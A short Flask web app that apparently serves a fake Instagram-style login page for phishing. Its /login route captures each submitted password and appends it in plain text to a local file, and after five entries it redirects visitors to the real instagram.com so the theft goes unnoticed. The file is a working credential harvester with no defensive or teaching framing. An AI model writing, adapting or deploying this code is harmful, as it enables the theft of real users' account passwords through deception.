from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route('/')
@app.route('/home')
def home():
    return render_template('index.html')

@app.route('/login', methods=["POST"])
def login():
    with open('file.txt', 'r') as f:
        lines = f.readlines()
        if len(lines) >= 5:
            return redirect("https://instagram.com/")
    with open('file.txt', 'a+') as f:
        name = request.form.get('password')
        # lines = f.readlines()
        f.writelines(f"\nPassword : {name}")
    return render_template('index.html', message=True)

if __name__ == '__main__':
    app.run(debug=True)
